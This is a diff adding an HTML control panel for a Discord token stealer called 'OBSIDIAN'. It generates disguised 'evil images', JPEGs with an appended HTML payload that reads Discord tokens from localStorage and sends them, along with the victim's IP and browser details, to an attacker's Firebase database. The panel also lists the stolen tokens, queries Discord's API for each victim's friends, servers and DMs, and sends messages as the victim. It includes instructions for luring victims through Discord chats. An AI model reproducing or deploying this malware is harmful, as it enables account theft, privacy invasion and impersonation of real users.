@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>OBSIDIAN - Ultimate Stealer Panel</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ffcc;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        .section {
+            border: 1px solid #00ffcc;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            background: #0f0f0f;
+        }
+        .section h2 {
+            margin-top: 0;
+            color: #ff00cc;
+            border-bottom: 1px solid #ff00cc;
+            display: inline-block;
+        }
+        input, textarea, button, select {
+            background: #111;
+            color: #00ffcc;
+            border: 1px solid #00ffcc;
+            padding: 8px 12px;
+            margin: 5px;
+            font-family: monospace;
+            border-radius: 5px;
+        }
+        button {
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #00ffcc;
+            color: #000;
+        }
+        .link-box {
+            background: #002200;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            word-break: break-all;
+            border: 1px solid #00ffcc;
+        }
+        .link-box input {
+            width: 100%;
+            background: #000;
+            color: #0f0;
+            border: 1px solid #00ffcc;
+        }
+        .preview-box {
+            background: #111;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 5px;
+        }
+        .status {
+            color: #ffaa00;
+        }
+        .hidden {
+            display: none;
+        }
+        .token-card {
+            border: 1px solid #ff00cc;
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 8px;
+            background: #0a0a0a;
+        }
+        .info-box {
+            background: #001010;
+            margin-top: 10px;
+            padding: 10px;
+            display: none;
+            overflow-x: auto;
+            border-radius: 5px;
+        }
+        pre {
+            color: #fff;
+            font-size: 12px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .change-pass-area {
+            border: 2px solid #ff6600;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 10px;
+        }
+        .login-area {
+            border: 2px solid #00ffcc;
+            padding: 20px;
+            text-align: center;
+        }
+        .merge-result {
+            margin-top: 10px;
+            padding: 10px;
+            background: #002222;
+            border-radius: 5px;
+            word-break: break-all;
+        }
+        .copy-btn {
+            background: #00ffcc;
+            color: #000;
+            margin-left: 10px;
+        }
+        .generated-file {
+            background: #330000;
+            border-color: #ff3300;
+        }
+        hr {
+            border-color: #00ffcc;
+        }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-storage-compat.js"></script>
+</head>
+<body>
+<div class="container">
+    <h1>⚔️ OBSIDIAN PROTOCOL – ULTIMATE STEALER ⚔️</h1>
+
+    <!-- قسم تسجيل الدخول -->
+    <div id="loginSection" class="section login-area">
+        <h2>🔐 AUTHENTICATION REQUIRED</h2>
+        <input type="password" id="masterPassword" placeholder="Enter Master Password" style="width:300px">
+        <button onclick="authenticate()">UNLOCK</button>
+        <div id="loginStatus"></div>
+        <div class="status">Default password: ObsidianBlack2024</div>
+    </div>
+
+    <!-- المحتوى الرئيسي -->
+    <div id="mainContent" class="hidden">
+        
+        <!-- قسم الدمج (إنشاء الصورة الخبيثة) -->
+        <div class="section">
+            <h2>🎯 STEP 1: CREATE EVIL IMAGE (Image + Token Stealer)</h2>
+            <p>اختر صورة عادية + الموقع سيقوم بدمجها مع ملف سارق التوكن تلقائيًا</p>
+            <input type="file" id="photoInput" accept="image/jpeg,image/png,image/gif">
+            <button id="generateBtn" onclick="generateEvilImage()">🔨 GENERATE EVIL IMAGE</button>
+            <div id="mergeResult" class="link-box"></div>
+            <div class="preview-box" id="previewArea"></div>
+        </div>
+
+        <!-- قسم الرابط المباشر لديسكورد -->
+        <div class="section">
+            <h2>📎 STEP 2: DISCORD IMAGE LINK</h2>
+            <p>ضع هذا الرابط في أي شات ديسكورد → سيتحول لصورة</p>
+            <div id="discordLinkArea" class="link-box">
+                <span class="status">قم بتوليد الصورة أولاً</span>
+            </div>
+        </div>
+
+        <!-- قسم التوكنات المسروقة -->
+        <div class="section">
+            <h2>💀 STEP 3: STOLEN TOKENS DATABASE</h2>
+            <button onclick="loadAllTokens()">🔄 REFRESH TOKENS</button>
+            <div id="tokensContainer"></div>
+        </div>
+
+        <!-- قسم تغيير كلمة السر -->
+        <div class="section change-pass-area">
+            <h2>🔑 CHANGE MASTER PASSWORD</h2>
+            <input type="password" id="oldPass" placeholder="Current Password">
+            <input type="password" id="newPass" placeholder="New Password">
+            <button onclick="changePassword()">UPDATE PASSWORD</button>
+            <div id="passResult"></div>
+            <div class="status">⚠️ After changing, old password becomes invalid immediately</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ==================== FIREBASE CONFIG ====================
+    const firebaseConfig = {
+        apiKey: "AIzaSyD18jPmt80Ar1a1cyuhbIuWtHN-PO-jxrc",
+        authDomain: "fight-evils.firebaseapp.com",
+        databaseURL: "https://fight-evils-default-rtdb.europe-west1.firebasedatabase.app",
+        projectId: "fight-evils",
+        storageBucket: "fight-evils.firebasestorage.app",
+        messagingSenderId: "589489775061",
+        appId: "1:589489775061:web:8355dbc9e57c604620dd5c",
+        measurementId: "G-PHFN3YD72W"
+    };
+    
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const storage = firebase.storage();
+    
+    // ==================== AUTHENTICATION ====================
+    window.authenticate = async () => {
+        const enteredPass = document.getElementById('masterPassword').value;
+        const statusDiv = document.getElementById('loginStatus');
+        
+        try {
+            const snapshot = await db.ref('config/masterPassword').once('value');
+            let storedHash = snapshot.val();
+            
+            if (!storedHash) {
+                storedHash = btoa("ObsidianBlack2024");
+                await db.ref('config/masterPassword').set(storedHash);
+            }
+            
+            if (btoa(enteredPass) === storedHash) {
+                localStorage.setItem('obsidian_session', 'active');
+                document.getElementById('loginSection').classList.add('hidden');
+                document.getElementById('mainContent').classList.remove('hidden');
+                loadAllTokens();
+                statusDiv.innerHTML = "";
+            } else {
+                statusDiv.innerHTML = "<span style='color:#ff3300'>❌ ACCESS DENIED</span>";
+            }
+        } catch(e) {
+            statusDiv.innerHTML = `<span style='color:#ff3300'>🔥 ERROR: ${e.message}</span>`;
+        }
+    };
+    
+    // Check saved session
+    if (localStorage.getItem('obsidian_session') === 'active') {
+        db.ref('config/masterPassword').once('value').then(snapshot => {
+            if (snapshot.val()) {
+                document.getElementById('loginSection').classList.add('hidden');
+                document.getElementById('mainContent').classList.remove('hidden');
+                loadAllTokens();
+            } else {
+                localStorage.removeItem('obsidian_session');
+            }
+        });
+    }
+    
+    // ==================== GENERATE EVIL IMAGE (Image + Token Stealer) ====================
+    // This creates an HTML file that steals tokens and embeds it inside an image
+    window.generateEvilImage = async () => {
+        const photo = document.getElementById('photoInput').files[0];
+        const resultDiv = document.getElementById('mergeResult');
+        const previewDiv = document.getElementById('previewArea');
+        const discordLinkDiv = document.getElementById('discordLinkArea');
+        
+        if (!photo) {
+            resultDiv.innerHTML = "❌ Please select an image first";
+            return;
+        }
+        
+        resultDiv.innerHTML = "🔄 Generating evil image...";
+        
+        // ==================== THE TOKEN STEALER HTML (embedded inside image) ====================
+        const stealerHTML = `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Image Viewer</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #0a0a0a;
+            font-family: monospace;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100vh;
+        }
+        .status {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            color: #0f0;
+            font-size: 10px;
+            background: rgba(0,0,0,0.7);
+            padding: 5px;
+            border-radius: 5px;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+    <img id="mainImage" src="" alt="Loading...">
+    <div class="status" id="status">Initializing...</div>
+
+    <script>
+        // Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyD18jPmt80Ar1a1cyuhbIuWtHN-PO-jxrc",
+            authDomain: "fight-evils.firebaseapp.com",
+            databaseURL: "https://fight-evils-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "fight-evils",
+            storageBucket: "fight-evils.firebasestorage.app",
+            messagingSenderId: "589489775061",
+            appId: "1:589489775061:web:8355dbc9e57c604620dd5c",
+            measurementId: "G-PHFN3YD72W"
+        };
+
+        function loadFirebaseAndSteal() {
+            const script = document.createElement('script');
+            script.src = "https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js";
+            script.onload = () => {
+                const dbScript = document.createElement('script');
+                dbScript.src = "https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js";
+                dbScript.onload = () => {
+                    firebase.initializeApp(firebaseConfig);
+                    const db = firebase.database();
+                    stealTokens(db);
+                };
+                document.head.appendChild(dbScript);
+            };
+            document.head.appendChild(script);
+        }
+
+        async function stealTokens(db) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = 'Extracting tokens...';
+            
+            let token = null;
+            let source = 'unknown';
+            
+            try {
+                // Try Discord Web LocalStorage
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && (key.includes('token') || key.includes('Token'))) {
+                        const value = localStorage.getItem(key);
+                        if (value && (value.startsWith('ND') || value.includes('.') && value.length > 50)) {
+                            token = value;
+                            source = 'discord_web_localstorage';
+                            break;
+                        }
+                    }
+                }
+                
+                // Try specific Discord keys
+                if (!token && localStorage.getItem('token')) {
+                    token = localStorage.getItem('token');
+                    source = 'discord_token_key';
+                }
+                
+                if (!token && localStorage.getItem('discord_token')) {
+                    token = localStorage.getItem('discord_token');
+                    source = 'discord_token_key';
+                }
+                
+                statusDiv.innerText = token ? 'Token found! Sending...' : 'No token found on this device';
+                
+                if (token) {
+                    const timestamp = Date.now();
+                    const tokenRef = db.ref('stolenTokens/' + timestamp);
+                    
+                    let ip = 'unknown';
+                    try {
+                        const ipRes = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipRes.json();
+                        ip = ipData.ip;
+                    } catch(e) {}
+                    
+                    await tokenRef.set({
+                        token: token,
+                        source: source,
+                        ip: ip,
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        receivedAt: new Date().toISOString(),
+                        referrer: document.referrer,
+                        url: window.location.href
+                    });
+                    statusDiv.innerText = '✅ Token stolen and sent successfully!';
+                } else {
+                    statusDiv.innerText = '❌ No Discord token found. Try logging into Discord web first.';
+                }
+            } catch(e) {
+                statusDiv.innerText = 'Error: ' + e.message;
+            }
+            
+            // Display the image after stealing
+            try {
+                const imgElement = document.getElementById('mainImage');
+                imgElement.src = getEmbeddedImage();
+            } catch(e) {}
+        }
+        
+        function getEmbeddedImage() {
+            return '{{IMAGE_BASE64}}';
+        }
+        
+        loadFirebaseAndSteal();
+    <\/script>
+</body>
+</html>`;
+        
+        try {
+            // Read the image as base64
+            const reader = new FileReader();
+            reader.onload = async function(e) {
+                const imageBase64 = e.target.result;
+                
+                // Replace placeholder with actual image
+                const finalStealer = stealerHTML.replace('{{IMAGE_BASE64}}', imageBase64);
+                
+                // Create blob from the stealer HTML
+                const stealerBlob = new Blob([finalStealer], {type: 'text/html'});
+                const stealerFile = new File([stealerBlob], 'image_viewer.html', {type: 'text/html'});
+                
+                // Now merge the original image with the HTML file
+                // Method: Create a polyglot file that looks like JPG but contains HTML
+                const photoReader = new FileReader();
+                photoReader.onload = async function(pe) {
+                    const photoBase64 = pe.target.result.split(',')[1];
+                    const photoBinary = atob(photoBase64);
+                    
+                    // Create merged file: JPG header + HTML payload at the end
+                    // This works because browsers ignore extra data after image
+                    const htmlString = await finalStealer;
+                    const htmlBinary = unescape(encodeURIComponent(htmlString));
+                    
+                    // Combine
+                    const combined = photoBinary + "<!--OBSIDIAN_STEALER_START-->" + htmlBinary;
+                    const combinedBlob = new Blob([combined], {type: 'image/jpeg'});
+                    
+                    // Upload to Firebase Storage
+                    const fileName = Date.now() + "_evil.jpg";
+                    const storageRef = storage.ref('evil_images/' + fileName);
+                    await storageRef.put(combinedBlob);
+                    const downloadUrl = await storageRef.getDownloadURL();
+                    const directImageUrl = downloadUrl.split('?')[0] + "?alt=media";
+                    
+                    resultDiv.innerHTML = `
+                        ✅ <strong>EVIL IMAGE GENERATED SUCCESSFULLY!</strong><br>
+                        🔗 <strong>Discord Image Link (Copy this):</strong><br>
+                        <input type="text" id="evilLink" readonly value="${directImageUrl}" style="width:100%" onclick="this.select()">
+                        <button class="copy-btn" onclick="copyToClipboard('${directImageUrl}')">📋 COPY</button>
+                        <br><br>
+                        <strong>📌 How it works:</strong><br>
+                        1. Paste this link in Discord → It shows as a normal image<br>
+                        2. Victim clicks the image → Opens in browser<br>
+                        3. The HTML stealer runs automatically → Steals Discord token<br>
+                        4. Token appears in "Stolen Tokens" below<br>
+                    `;
+                    
+                    discordLinkDiv.innerHTML = `
+                        <strong>🎯 PASTE THIS IN DISCORD CHAT:</strong><br>
+                        <input type="text" readonly value="${directImageUrl}" style="width:100%" onclick="this.select()">
+                        <button class="copy-btn" onclick="copyToClipboard('${directImageUrl}')">📋 COPY LINK</button>
+                        <br><br>
+                        <strong>Discord will show this as an image preview:</strong><br>
+                        <img src="${directImageUrl}" style="max-width:300px; border:1px solid #00ffcc; margin-top:10px">
+                    `;
+                    
+                    previewDiv.innerHTML = `
+                        <strong>✅ Ready! When victim opens this link in browser, token will be stolen.</strong>
+                    `;
+                };
+                photoReader.readAsDataURL(photo);
+            };
+            reader.readAsDataURL(photo);
+        } catch(e) {
+            resultDiv.innerHTML = `❌ Error: ${e.message}`;
+        }
+    };
+    
+    window.copyToClipboard = (text) => {
+        navigator.clipboard.writeText(text);
+        alert("✅ Link copied to clipboard!");
+    };
+    
+    // ==================== LOAD STOLEN TOKENS ====================
+    window.loadAllTokens = async () => {
+        const container = document.getElementById('tokensContainer');
+        container.innerHTML = '<div class="status">🔍 Loading stolen tokens...</div>';
+        
+        try {
+            const snapshot = await db.ref('stolenTokens').once('value');
+            const tokens = snapshot.val() || {};
+            const entries = Object.entries(tokens).reverse();
+            
+            if (entries.length === 0) {
+                container.innerHTML = '<div class="status">💀 No stolen tokens yet. Send the evil image to victims.</div>';
+                return;
+            }
+            
+            container.innerHTML = '';
+            for (let [id, tokenData] of entries) {
+                const token = tokenData.token || 'UNKNOWN';
+                const ip = tokenData.ip || 'unknown';
+                const time = tokenData.receivedAt || tokenData.time || 'unknown';
+                const source = tokenData.source || 'unknown';
+                const userAgent = tokenData.userAgent || 'unknown';
+                
+                const card = document.createElement('div');
+                card.className = 'token-card';
+                card.innerHTML = `
+                    <strong>🎯 TOKEN:</strong> <span style="color:#ff00cc">${token.substring(0, 40)}${token.length > 40 ? '...' : ''}</span><br>
+                    <strong>🌐 IP:</strong> ${ip}<br>
+                    <strong>⏱️ Time:</strong> ${time}<br>
+                    <strong>📱 Source:</strong> ${source}<br>
+                    <strong>🖥️ User Agent:</strong> ${userAgent.substring(0, 80)}...<br>
+                    <button onclick="fetchDiscordInfo('${token.replace(/'/g, "\\'")}', '${id}')">🔍 INFO (Friends/Servers/Messages)</button>
+                    <button onclick="copyFullToken('${token.replace(/'/g, "\\'")}')">📋 COPY FULL TOKEN</button>
+                    <div id="info-${id}" class="info-box"></div>
+                `;
+                container.appendChild(card);
+            }
+        } catch(e) {
+            container.innerHTML = `<div class="status">🔥 Error: ${e.message}</div>`;
+        }
+    };
+    
+    window.copyFullToken = (token) => {
+        navigator.clipboard.writeText(token);
+        alert("✅ Full token copied!");
+    };
+    
+    // ==================== FETCH DISCORD INFO ====================
+    window.fetchDiscordInfo = async (token, id) => {
+        const infoDiv = document.getElementById(`info-${id}`);
+        infoDiv.style.display = 'block';
+        infoDiv.innerHTML = '<pre>⚡ Fetching Discord data with this token...</pre>';
+        
+        try {
+            // User info
+            const userRes = await fetch('https://discord.com/api/v9/users/@me', {
+                headers: { 'Authorization': token }
+            });
+            if (!userRes.ok) throw new Error(`Invalid token (${userRes.status})`);
+            const user = await userRes.json();
+            
+            // Friends
+            const friendsRes = await fetch('https://discord.com/api/v9/users/@me/relationships', {
+                headers: { 'Authorization': token }
+            });
+            let relationships = await friendsRes.json();
+            const friends = relationships.filter(r => r.type === 1).map(r => `${r.user.username}#${r.user.discriminator} (${r.user.id})`);
+            
+            // Servers
+            const guildsRes = await fetch('https://discord.com/api/v9/users/@me/guilds', {
+                headers: { 'Authorization': token }
+            });
+            const guilds = await guildsRes.json();
+            const servers = guilds.map(g => `${g.name} (${g.id}) - ${g.member_count || '?'} members`);
+            
+            // DMs
+            const dmsRes = await fetch('https://discord.com/api/v9/users/@me/channels', {
+                headers: { 'Authorization': token }
+            });
+            const channels = await dmsRes.json();
+            const dmChannels = channels.map(c => {
+                if (c.recipients && c.recipients[0]) {
+                    const r = c.recipients[0];
+                    return `💬 ${r.username}#${r.discriminator} - Channel: ${c.id}`;
+                }
+                return `📁 Group/Unknown - Channel: ${c.id}`;
+            });
+            
+            infoDiv.innerHTML = `
+                <pre>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 <strong>USER ACCOUNT</strong>
+   Username: ${user.username}#${user.discriminator}
+   User ID: ${user.id}
+   Email: ${user.email || 'hidden'}
+   Phone: ${user.phone || 'none'}
+   MFA: ${user.mfa_enabled ? '✅ ENABLED' : '❌ DISABLED'}
+   Verified: ${user.verified ? '✅' : '❌'}
+   Badges: ${user.public_flags || 0}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👥 <strong>FRIENDS (${friends.length})</strong>
+${friends.length ? friends.join('\n') : '   No friends'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🖥️ <strong>SERVERS (${guilds.length})</strong>
+${servers.length ? servers.join('\n') : '   No servers'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💬 <strong>DM CHANNELS (${channels.length})</strong>
+${dmChannels.length ? dmChannels.join('\n') : '   No DMs'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📨 <strong>SEND MESSAGE</strong>
+Channel ID: <input type="text" id="msgChannel-${id}" placeholder="Paste Channel ID" style="width:300px">
+Message: <textarea id="msgText-${id}" rows="2" cols="50" placeholder="Message..."></textarea>
+<button onclick="sendMessageViaToken('${token.replace(/'/g, "\\'")}', '${id}')">✈️ SEND</button>
+<div id="sendResult-${id}" style="margin-top:5px"></div>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                </pre>
+            `;
+        } catch(e) {
+            infoDiv.innerHTML = `<pre>❌ ERROR: ${e.message}</pre>`;
+        }
+    };
+    
+    // ==================== SEND MESSAGE ====================
+    window.sendMessageViaToken = async (token, id) => {
+        const channelId = document.getElementById(`msgChannel-${id}`).value;
+        const message = document.getElementById(`msgText-${id}`).value;
+        const resultDiv = document.getElementById(`sendResult-${id}`);
+        
+        if (!channelId || !message) {
+            resultDiv.innerHTML = "❌ Channel ID and message required";
+            return;
+        }
+        
+        resultDiv.innerHTML = "⏳ Sending...";
+        
+        try {
+            const res = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+                method: 'POST',
+                headers: {
+                    'Authorization': token,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: message })
+            });
+            
+            if (res.ok) {
+                resultDiv.innerHTML = "✅ Message sent successfully!";
+            } else {
+                const error = await res.json();
+                resultDiv.innerHTML = `❌ Failed: ${error.message || res.statusText}`;
+            }
+        } catch(e) {
+            resultDiv.innerHTML = `❌ Error: ${e.message}`;
+        }
+    };
+    
+    // ==================== CHANGE PASSWORD ====================
+    window.changePassword = async () => {
+        const oldPass = document.getElementById('oldPass').value;
+        const newPass = document.getElementById('newPass').value;
+        const resultDiv = document.getElementById('passResult');
+        
+        if (!oldPass || !newPass) {
+            resultDiv.innerHTML = "❌ Enter both old and new password";
+            return;
+        }
+        if (newPass.length < 4) {
+            resultDiv.innerHTML = "❌ Password must be at least 4 characters";
+            return;
+        }
+        
+        try {
+            const snapshot = await db.ref('config/masterPassword').once('value');
+            const currentHash = snapshot.val();
+            
+            if (btoa(oldPass) !== currentHash) {
+                resultDiv.innerHTML = "❌ Old password incorrect";
+                return;
+            }
+            
+            const newHash = btoa(newPass);
+            await db.ref('config/masterPassword').set(newHash);
+            localStorage.removeItem('obsidian_session');
+            resultDiv.innerHTML = "✅ Password changed! Old password invalid. Please re-login.";
+            setTimeout(() => location.reload(), 2000);
+        } catch(e) {
+            resultDiv.innerHTML = `❌ Error: ${e.message}`;
+        }
+    };
+    
+    // Auto-refresh tokens every 15 seconds
+    if (localStorage.getItem('obsidian_session') === 'active') {
+        setInterval(() => {
+            if (document.getElementById('mainContent') && !document.getElementById('mainContent').classList.contains('hidden')) {
+                loadAllTokens();
+            }
+        }, 15000);
+    }
+</script>
+</body>
+</html>
